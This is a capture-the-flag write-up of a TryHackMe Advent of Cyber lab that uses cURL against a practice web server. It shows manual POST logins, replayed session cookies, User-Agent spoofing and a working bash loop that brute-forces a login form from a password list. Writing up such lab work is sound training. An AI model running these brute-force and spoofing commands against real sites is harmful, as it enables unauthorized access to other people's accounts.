# Day 24: Exploitation with cURL - Hoperation Eggsploit

## 📝 Scenario
In the final showdown on Day 24, the "Evil Easter Bunnies" are operating a web control panel that holds a wormhole open, allowing enemy reinforcements to pour into Wareville. The Blue Team must shut down this panel to cut off King Malhare's support.

As a security operator, my resources were limited: no GUI, no browser, and no Burp Suite. I had only a command prompt. My objective was to use **cURL** to manually interact with the web server—sending POST requests, managing sessions via cookies, brute-forcing login forms, and spoofing User-Agents—to authenticate and trigger the shutdown command.

## 🛠️ Tools & Technologies Used
* **cURL (Client URL):** A command-line tool used to transfer data to and from a server. It was my primary interface for crafting raw HTTP requests.
* **HTTP Methods (GET/POST):** The standard verbs used to retrieve data (GET) or submit data (POST) to the web server.
* **Bash Scripting:** Used to automate the brute-force attack by looping through a password list and executing cURL commands for each entry.

## 🧠 Theoretical Concepts
* **HTTP Requests/Responses:**
    * **Request:** The client asks for a resource (e.g., `GET /index.php`).
    * **Response:** The server replies with a status code (e.g., `200 OK`) and the body content (HTML).
* **Cookies & Sessions:** Since HTTP is stateless, servers use cookies (small pieces of data stored by the client) to remember who you are. In cURL, these must be manually saved (`-c`) and sent (`-b`).
* **User-Agent Spoofing:** Servers often check the "User-Agent" header to identify the client software. Attackers spoof this header to bypass restrictions or impersonate trusted devices.



## 🕵️‍♂️ Investigation Walkthrough

### Step 1: Basic Authentication (POST Request)
I needed to authenticate to the `/post.php` endpoint. Unlike a browser form, I had to construct the POST body manually.
1.  **Command:**
    ```bash
    curl -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
    ```
2.  **Result:** The server accepted the credentials and returned the first flag in the response body.

### Step 2: Session Management (Cookies)
The `/cookie.php` endpoint required a valid session. This involved a two-step process: logging in to get the cookie, then replaying that cookie to prove identity.
1.  **Login & Save Cookie:**
    ```bash
    curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/cookie.php
    ```
    *`cookies.txt` now contained the session ID.*
2.  **Reuse Cookie:**
    ```bash
    curl -b cookies.txt http://MACHINE_IP/cookie.php
    ```
3.  **Result:** The server recognized the session from the file and granted access to the second flag.

### Step 3: Brute-Forcing Authentication
The `/bruteforce.php` endpoint was protected by a weak password. I created a bash script to automate the guessing process using a list of potential passwords.
1.  **Script (`loop.sh`):**
    ```bash
    for pass in $(cat passwords.txt); do
      response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
      if echo "$response" | grep -q "Welcome"; then
        echo "Password found: $pass"
        break
      fi
    done
    ```
2.  **Execution:** Ran the script and discovered the valid password.

### Step 4: Bypassing User-Agent Checks
The `/agent.php` endpoint blocked standard cURL requests. I had to pretend to be a specific internal device ("TBFC").
1.  **Command:**
    ```bash
    curl -A "TBFC" http://MACHINE_IP/agent.php
    ```
2.  **Result:** The server trusted the custom User-Agent string and revealed the flag.

### Bonus Mission: Closing the Wormhole
To shut down the portal, I combined all techniques: brute-forcing a PIN (4000-5000) and interacting with the control panel API.
1.  **Strategy:** I wrote a similar loop script to iterate through the numeric PIN range, sending POST requests to the terminal endpoint until the correct PIN triggered the shutdown sequence.

## 🧠 Key Takeaways
* **The Power of CLI:** You don't always need a GUI. cURL allows for precise, low-level interaction with web servers, often revealing details (like headers) that browsers hide.
* **State Management:** Understanding how to manually handle cookies (`-c` / `-b`) is crucial for testing sessions and APIs that require persistence.
* **Automation:** Simple bash loops combined with cURL can replace heavy automated tools (like Hydra) for basic brute-forcing tasks, offering a lightweight alternative in restricted environments.

## 📸 Screenshots
*Below are the findings from the cURL exploitation.*

![POST Request Flag](screenshots/Day%2024/1.png)
*Figure 1: Sending a POST request to retrieve the first flag.*

![Brute Force Script](screenshots/Day%2024/2.png)
*Figure 2: Creating and running the bash script to crack the admin password.*

![User-Agent Spoofing](screenshots/Day%2024/3.png)
*Figure 3: Retrieving the final flag.*

## 🔗 References
* [TryHackMe - Advent of Cyber 2025](https://tryhackme.com/adventofcyber25)